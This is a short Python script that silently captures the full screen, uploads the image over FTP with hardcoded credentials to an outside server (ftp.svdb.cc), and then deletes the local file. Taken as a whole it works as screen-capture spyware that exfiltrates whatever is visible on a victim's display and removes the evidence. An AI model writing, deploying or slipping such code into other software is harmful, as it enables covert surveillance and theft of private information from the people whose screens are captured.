import ftplib
import pyautogui
import string
import random
import os

letters = string.ascii_lowercase
result_str = ''.join(random.choice(letters) for i in range(8))
from PIL import ImageGrab
ss_img = ImageGrab.grab()
ss_img.save("screenshot_"+result_str+".png")

screenshot_path = "screenshot_"+result_str+".png"
session = ftplib.FTP('ftp.svdb.cc', 'ftp-user', 'Password1')
file = open(screenshot_path, 'rb')
session.storbinary("STOR " + screenshot_path, file)
file.close()
print("File uploaded successfully")
os.remove(screenshot_path)
